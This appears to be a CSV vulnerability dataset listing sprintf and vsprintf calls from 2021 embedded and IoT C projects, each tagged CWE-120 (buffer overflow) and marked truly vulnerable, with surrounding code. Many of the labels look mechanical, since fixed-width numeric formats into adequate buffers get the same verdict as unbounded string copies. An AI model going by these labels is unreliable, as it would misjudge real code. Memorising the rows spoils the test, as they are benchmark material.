GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CWJAP,""AT+CWJAP=\""%s\"",\""%s\"""",SSID,PASSWORD);",120,1,"	char AT_CWJAP[64];
	memset(AT_CWJAP,0,sizeof(AT_CWJAP));
	sprintf(AT_CWJAP,""AT+CWJAP=\""%s\"",\""%s\"""",SSID,PASSWORD);
	ESP_SendAT(AT_CWJAP);
	ESP_SYNC_RECEIVE(ESP_WIFI_CONN_TIMEOUT_MS);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CWJAP,""AT+CWSAP=\""%s\"",\""%s\"",11,3"",SSID,PASSWORD);",120,1,"	char AT_CWJAP[64];
	memset(AT_CWJAP,0,sizeof(AT_CWJAP));
	sprintf(AT_CWJAP,""AT+CWSAP=\""%s\"",\""%s\"",11,3"",SSID,PASSWORD);
	ESP_SendAT(AT_CWJAP);
	ESP_SYNC_RECEIVE(ESP_WIFI_CONN_TIMEOUT_MS);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(cmd,""AT+CIPSEND=%hhu,%hu"",clientID,len);",120,1,"	char cmd[20];uint16_t TIMEOUT_CNT=ESP_SERVER_TRANSMIT_STANDBY_TIMEOUT_MS;
	memset(cmd,0,sizeof(0));
	sprintf(cmd,""AT+CIPSEND=%hhu,%hu"",clientID,len);
	ESP_SERVER_TRANSMIT_AVAILABLE=0;
	ESP_SendAT(cmd);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CIPSTART,""AT+CIPSTART=\""TCP\"",\""%s\"",%s"",ip,port);",120,1,"	char AT_CIPSTART[80];
	memset(AT_CIPSTART,0,sizeof(AT_CIPSTART));
	sprintf(AT_CIPSTART,""AT+CIPSTART=\""TCP\"",\""%s\"",%s"",ip,port);
	ESP_SendAT(AT_CIPSTART);
	ESP_SYNC_RECEIVE(5000);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CIPSERVER,""AT+CIPSERVER=1,%s"",port);",120,1,"	char AT_CIPSERVER[30];
	memset(AT_CIPSERVER,0,sizeof(AT_CIPSERVER));
	sprintf(AT_CIPSERVER,""AT+CIPSERVER=1,%s"",port);
	ESP_SendAT(AT_CIPSERVER);
	ESP_SYNC_RECEIVE(1000);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);",120,1,"	memset(error,0,sizeof(error));
	memset(content_length,0,sizeof(content_length));
	sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);
	content_len=strlen(ESP_SERVER_HTTP_ERRPAGE_404_1)+strlen(error)+strlen(ESP_SERVER_HTTP_ERRPAGE_404_2);
	sprintf(content_length,""Content-Length: %hu\r\n\r\n"",content_len);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(content_length,""Content-Length: %hu\r\n\r\n"",content_len);",120,1,"	sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);
	content_len=strlen(ESP_SERVER_HTTP_ERRPAGE_404_1)+strlen(error)+strlen(ESP_SERVER_HTTP_ERRPAGE_404_2);
	sprintf(content_length,""Content-Length: %hu\r\n\r\n"",content_len);
	//ESP_SERVER_HTTP_RESPONSE_HEAD
	ESP_CMD_SendToClient(clientID,ESP_SERVER_HTTP_RESPONSE_HEAD);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(temp,""%s %s %s %s"",ESP_SSID,ESP_PASSWD,ESP_TCP_IPADDR,ESP_TCP_PORT);",120,1,"	if(ESP_SSID[0]>='0'&&ESP_SSID[0]<='z')
	{
		sprintf(temp,""%s %s %s %s"",ESP_SSID,ESP_PASSWD,ESP_TCP_IPADDR,ESP_TCP_PORT);
	}
	else
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(temp,""Invalid Invalid 0.0.0.0 0"");",120,1,"	else
	{
		sprintf(temp,""Invalid Invalid 0.0.0.0 0"");
	}
	ESP_SERVER_HTTP_STATICPAGE(clientID,temp);
"
2021\intelli-switch\stm32\MDK-ARM\illuminanceMeas.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\illuminanceMeas.c,"sprintf(buffer,""ILLU:%.1f lx"",illuminance);",120,1,"	//ӡϢ
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,""ILLU:%.1f lx"",illuminance);
	if(!AppMode)
		l_print(buffer,4,Left);
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"sprintf((char*)databuff,""$%.2f:%hhu:%.2f:%.1f#"",bmp_280_temperature,DHT11_HUMIDITY,bmp_280_atmospressure,illuminance);",120,1,"{
	memset(databuff,0,sizeof(databuff));
	sprintf((char*)databuff,""$%.2f:%hhu:%.2f:%.1f#"",bmp_280_temperature,DHT11_HUMIDITY,bmp_280_atmospressure,illuminance);
	
}
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"sprintf(timebuff,""%s %02hhu:%02hhu:%02hhu"",week,hour,minute,second);",120,1,"	
	memset(timebuff,0,sizeof(timebuff));
	sprintf(timebuff,""%s %02hhu:%02hhu:%02hhu"",week,hour,minute,second);
	l_print(timebuff,1,Middle);
	ESP8266_WatchDog();
"
2021\iot2020-2021\sekkyone\main.c,Dataset Download,../../Dataset Download/2021\iot2020-2021\sekkyone\main.c,"sprintf(json, ""{\""id\"": \""%s\"", \""temperature\"": \""%s\"", \""humidity\"": \""%s\"", \""levelFlame\"": \""%d\"", \""levelFill\"": \""%d\""}"",",120,1,"    static char json[128];

    sprintf(json, ""{\""id\"": \""%s\"", \""temperature\"": \""%s\"", \""humidity\"": \""%s\"", \""levelFlame\"": \""%d\"", \""levelFill\"": \""%d\""}"",
                  EMCUTE_ID, sensors->temp, sensors->hum, sensors->level_flame, sensors->level_fill);
    
"
2021\iot2020-2021\sekkyone\main.c,Dataset Download,../../Dataset Download/2021\iot2020-2021\sekkyone\main.c,"sprintf(fill_level,""%d"", (int)(100.0 * (1.0 * distance) / atoi(BUCKET_HEIGHT)));",120,1,"        
        hd44780_set_cursor(&dev_lcd,0,1);
        sprintf(fill_level,""%d"", (int)(100.0 * (1.0 * distance) / atoi(BUCKET_HEIGHT)));
        hd44780_print(&dev_lcd,""F: "");
        hd44780_print(&dev_lcd, fill_level);
"
2021\IoTea\iotea-camera\main\app_aws.c,Dataset Download,../../Dataset Download/2021\IoTea\iotea-camera\main\app_aws.c,"sprintf(topic_name, ""IoTea/%s/camera"", CONFIG_PLANT_NAME);",120,1,"
  char topic_name[100];
  sprintf(topic_name, ""IoTea/%s/camera"", CONFIG_PLANT_NAME);

  const char *TOPIC = (const char *)&topic_name;
"
2021\IoTea\iotea-camera\main\app_aws.c,Dataset Download,../../Dataset Download/2021\IoTea\iotea-camera\main\app_aws.c,"sprintf(topic_name, ""IoTea/%s/trigger"", CONFIG_PLANT_NAME);",120,1,"  // Subscribe to the trigger topic for PLANT_NAME
  char topic_name[100];
  sprintf(topic_name, ""IoTea/%s/trigger"", CONFIG_PLANT_NAME);

  const char *TOPIC = (const char *)&topic_name;
"
2021\IOT_Project_1\main.c,Dataset Download,../../Dataset Download/2021\IOT_Project_1\main.c,"sprintf(str, ""%u"", IP[i]);",120,1,"    for (i = 0; i < IP_ADD_LENGTH; i++)
    {
        sprintf(str, ""%u"", IP[i]);
        putsUart0(str);
        if (i < IP_ADD_LENGTH-1)
"
2021\IOT_Project_1\main.c,Dataset Download,../../Dataset Download/2021\IOT_Project_1\main.c,"sprintf(str, ""%02x"", MAC[i]);",120,1,"    for (i = 0; i < HW_ADD_LENGTH; i++)
    {
        sprintf(str, ""%02x"", MAC[i]);
        putsUart0(str);
        if (i < HW_ADD_LENGTH-1)
"
2021\IOT_Project_1\SYSTEM\uart0.c,Dataset Download,../../Dataset Download/2021\IOT_Project_1\SYSTEM\uart0.c,"sprintf(str, ""%u"", num);",120,1,"
        char str[10];
        sprintf(str, ""%u"", num);
        putsUart0(str);
        putcUart0('\n');
"
2021\Kiss-Light_Hub\src\daemon.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\daemon.c,"sprintf( str, ""%d\n"", getpid() );",120,1,"
        /* Get the current PID */
        sprintf( str, ""%d\n"", getpid() );

        /* Write PID to Lockfile */
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"sprintf( port_str, ""%d"", cfg->mqtt_port );",120,1,"     */
    char port_str[10];
    sprintf( port_str, ""%d"", cfg->mqtt_port );
    int sockfd_mqtt = open_nb_socket( cfg->mqtt_server, port_str );

"
2021\netifyd\src\nd-conntrack.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-conntrack.cpp,"sprintf(buffer,",120,1,"    char buffer[1024];

    sprintf(buffer,
        ""l3_proto: %hu, l4_proto: %hhu"",
        flow->l3_proto, flow->l4_proto);
"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"for (int i = 0; i < 4; i++, p += 2) sprintf(p, ""%02hhx"", digest[i]);",120,1,"
    p += ND_FLOW_CAPTURE_SUB_OFFSET;
    for (int i = 0; i < 4; i++, p += 2) sprintf(p, ""%02hhx"", digest[i]);
    strcat(p, "".cap"");

"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"sprintf(tohex, ""0x%04hx"", ssl.version);",120,1,"            char tohex[7];

            sprintf(tohex, ""0x%04hx"", ssl.version);
            j[""ssl""][""version""] = tohex;

"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"sprintf(tohex, ""0x%04hx"", ssl.cipher_suite);",120,1,"            j[""ssl""][""version""] = tohex;

            sprintf(tohex, ""0x%04hx"", ssl.cipher_suite);
            j[""ssl""][""cipher_suite""] = tohex;

"
2021\netifyd\src\nd-util.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-util.cpp,"sprintf(p, ""%02x"", digest_bin[i]);",120,1,"
    for (int i = 0; i < SHA1_DIGEST_LENGTH; i++, p += 2)
        sprintf(p, ""%02x"", digest_bin[i]);

    digest_str.assign(_digest);
"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"sprintf(mac_dst, ""%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"",",120,1,"        char mac_dst[ND_STR_ETHALEN + 1];

        sprintf(mac_dst, ""%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"",
            mac_src[0], mac_src[1], mac_src[2],
            mac_src[3], mac_src[4], mac_src[5]);
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\ArduinoJson\extras\tests\MsgPackSerializer\serializeObject.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\ArduinoJson\extras\tests\MsgPackSerializer\serializeObject.cpp,"sprintf(key, ""i%X"", i);",120,1,"    for (int i = 0; i < 16; ++i) {
      char key[16];
      sprintf(key, ""i%X"", i);
      object[key] = i;
    }
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\PZEM-004T-v30\PZEM004Tv30.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\PZEM-004T-v30\PZEM004Tv30.cpp,"sprintf(temp, ""%.2x "", buffer[i]);",120,1,"    for(uint16_t i = 0; i < len; i++){
        char temp[6];
        sprintf(temp, ""%.2x "", buffer[i]);
        Serial.print(temp);

"
2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,"sprintf(macStr, ""%02X%02X"", mac[4], mac[5]);",120,1,"  String ssidDeviceName;
  WiFi.macAddress(mac);
  sprintf(macStr, ""%02X%02X"", mac[4], mac[5]);
  ssidDeviceName = ssid1 + String(macStr);
  return  ssidDeviceName;  
"
2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,"sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0],  mac[1], mac[2], mac[3], mac[4], mac[5]);",120,1,"  char macStr[18] = {0};
  WiFi.macAddress(mac);
  sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0],  mac[1], mac[2], mac[3], mac[4], mac[5]); 
  return  String(macStr);
}
"
2021\Simple_8266_Data_Logger\v27\ESPxWebFlMgr.cpp,Dataset Download,../../Dataset Download/2021\Simple_8266_Data_Logger\v27\ESPxWebFlMgr.cpp,"sprintf(chunkSize, ""%zx\r\n"", len);",120,1,"        const char * footer = ""\r\n"";
        char chunkSize[11];
        sprintf(chunkSize, ""%zx\r\n"", len);
        fileManager->client().write(chunkSize, strlen(chunkSize));

"
2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,Dataset Download,../../Dataset Download/2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,"sprintf(buffer,""%5d"",Pulse);",120,1,"
    LCDCommand(0x86);
    sprintf(buffer,""%5d"",Pulse);
    LCDPuts(buffer);
   
"
2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,Dataset Download,../../Dataset Download/2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,"sprintf(buffer,""%5d"",Unit);",120,1,"   
    LCDCommand(0xc6);
    sprintf(buffer,""%5d"",Unit);
	LCDPuts(buffer);

"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%c\t%u\t%u\t%u\r\n"", cStatus, ( unsigned int ) pxTaskStatusArray[ x ].uxCurrentPriority, ( unsigned int ) pxTaskStatusArray[ x ].usStackHighWaterMark, ( unsigned int ) pxTaskStatusArray[ x ].xTaskNumber ); */",120,1,"
				/* Write the rest of the string. */
				sprintf( pcWriteBuffer, ""\t%c\t%u\t%u\t%u\r\n"", cStatus, ( unsigned int ) pxTaskStatusArray[ x ].uxCurrentPriority, ( unsigned int ) pxTaskStatusArray[ x ].usStackHighWaterMark, ( unsigned int ) pxTaskStatusArray[ x ].xTaskNumber ); /*lint !e586 sprintf() allowed as this is compiled with many compilers and this is a utility function only - not part of the core kernel implementation. */
				pcWriteBuffer += strlen( pcWriteBuffer ); /*lint !e9016 Pointer arithmetic ok on char pointers especially as in this case where it best denotes the intent of the code. */
			}
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%lu\t\t%lu%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter, ulStatsAsPercentage );",120,1,"						#ifdef portLU_PRINTF_SPECIFIER_REQUIRED
						{
							sprintf( pcWriteBuffer, ""\t%lu\t\t%lu%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter, ulStatsAsPercentage );
						}
						#else
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%u\t\t%u%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter, ( unsigned int ) ulStatsAsPercentage ); */",120,1,"							/* sizeof( int ) == sizeof( long ) so a smaller
							printf() library can be used. */
							sprintf( pcWriteBuffer, ""\t%u\t\t%u%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter, ( unsigned int ) ulStatsAsPercentage ); /*lint !e586 sprintf() allowed as this is compiled with many compilers and this is a utility function only - not part of the core kernel implementation. */
						}
						#endif
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%lu\t\t<1%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter );",120,1,"						#ifdef portLU_PRINTF_SPECIFIER_REQUIRED
						{
							sprintf( pcWriteBuffer, ""\t%lu\t\t<1%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter );
						}
						#else
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%u\t\t<1%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter ); */",120,1,"							/* sizeof( int ) == sizeof( long ) so a smaller
							printf() library can be used. */
							sprintf( pcWriteBuffer, ""\t%u\t\t<1%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter ); /*lint !e586 sprintf() allowed as this is compiled with many compilers and this is a utility function only - not part of the core kernel implementation. */
						}
						#endif
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,"sprintf(dp_str,""%d"",g_dev_info.dev_dp.app_relay_stat.dpid_num);",120,1,"
    UCHAR_T dp_str[10] = {0};
    sprintf(dp_str,""%d"",g_dev_info.dev_dp.app_relay_stat.dpid_num);
    ty_cJSON *js_power = ty_cJSON_GetObjectItem(root,dp_str);
    if (NULL == js_power)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,"sprintf(dp_str,""%d"",g_dev_info.dev_dp.switch_dp.dpid_num);",120,1,"
    UCHAR_T dp_str[10] = {0};
    sprintf(dp_str,""%d"",g_dev_info.dev_dp.switch_dp.dpid_num);
    ty_cJSON *js_channel = ty_cJSON_GetObjectItem(root,dp_str);
    if (NULL == js_channel)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"len = sprintf(buffer, ""%s\r\n"", fsd->vfs_dirent->name);",120,1,"            if (shortlist)
            {
                len = sprintf(buffer, ""%s\r\n"", fsd->vfs_dirent->name);
                if (sfifo_space(&fsd->fifo) < len)
                {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %02i:%02i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_hour, s_time->tm_min, fsd->vfs_dirent->name);",120,1,"                s_time = gmtime(&st.st_mtime);
                if (s_time->tm_year == current_year)
                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %02i:%02i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_hour, s_time->tm_min, fsd->vfs_dirent->name);
                else
                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %5i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_year + 1900, fsd->vfs_dirent->name);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %5i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_year + 1900, fsd->vfs_dirent->name);",120,1,"                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %02i:%02i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_hour, s_time->tm_min, fsd->vfs_dirent->name);
                else
                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %5i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_year + 1900, fsd->vfs_dirent->name);
                if (VFS_ISDIR(st.st_mode))
                    buffer[0] = 'd';
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"vsprintf(buffer, msg, arg);",120,1,"
    va_start(arg, msg);
    vsprintf(buffer, msg, arg);
    va_end(arg);
    strcat(buffer, ""\r\n"");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,"LITE_sprintf((char *__restrict__)ascii + i % 16, ""%c"", ((buf[i] >= ' ' && buf[i] <= '~') ?  buf[i] : '.'));",120,1,"            written += 1;
        }
        LITE_sprintf((char *__restrict__)ascii + i % 16, ""%c"", ((buf[i] >= ' ' && buf[i] <= '~') ?  buf[i] : '.'));

        if (((i + 1) % 16 == 0) || (i == len - 1)) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,"sprintf(base64buff, ""%s:%s"", client->auth_user, client->auth_password);",120,1,"
    httpclient_get_info(client, send_buf, send_idx, ""Authorization: Basic "", 0);
    sprintf(base64buff, ""%s:%s"", client->auth_user, client->auth_password);
    log_debug(""bAuth: %s"", base64buff) ;
    httpclient_base64enc(b_auth, base64buff);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,"sprintf((char *)pkt, ""%lu"", TIMEOUT);",120,1,"        os_strcpy ((char *)pkt, ""timeout"");
        pkt += 7 /*strlen(""timeout"")*/ + 1;
        sprintf((char *)pkt, ""%lu"", TIMEOUT);
#ifdef ET_DEBUG
        TFTP_PRT(""send option \""timeout %s\""\n"", (char *)pkt);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,"pkt += sprintf((char *)pkt, ""blksize%c%d%c"",",120,1,"        pkt += os_strlen((char *)pkt) + 1;
        /* try for more effic. blk size */
        pkt += sprintf((char *)pkt, ""blksize%c%d%c"",
                       0, TftpBlkSizeOption, 0);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\bim\bim_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\bim\bim_uart.c,"n=vsprintf(uart_buff, fmt, ap);",120,1,"	va_list ap;
    va_start(ap, fmt);
    n=vsprintf(uart_buff, fmt, ap);
    va_end(ap);
    uart_putchar(uart_buff);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"int __wrap_vasprintf(char **ret, const char *format, va_list ap)",120,1,"}

int __wrap_vasprintf(char **ret, const char *format, va_list ap)
{
	size_t size;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"int __wrap_asprintf(char **ret, const char *format, ...)",120,1,"}

int __wrap_asprintf(char **ret, const char *format, ...)
{
	va_list ap;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"len = __wrap_vasprintf(ret, format, ap);",120,1,"
	va_start(ap, format);
	len = __wrap_vasprintf(ret, format, ap);
	va_end(ap);
	return len;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"int __wrap_sprintf(char *str, const char *format, ...)",120,1,"}

int __wrap_sprintf(char *str, const char *format, ...)
{
	va_list ap;
"
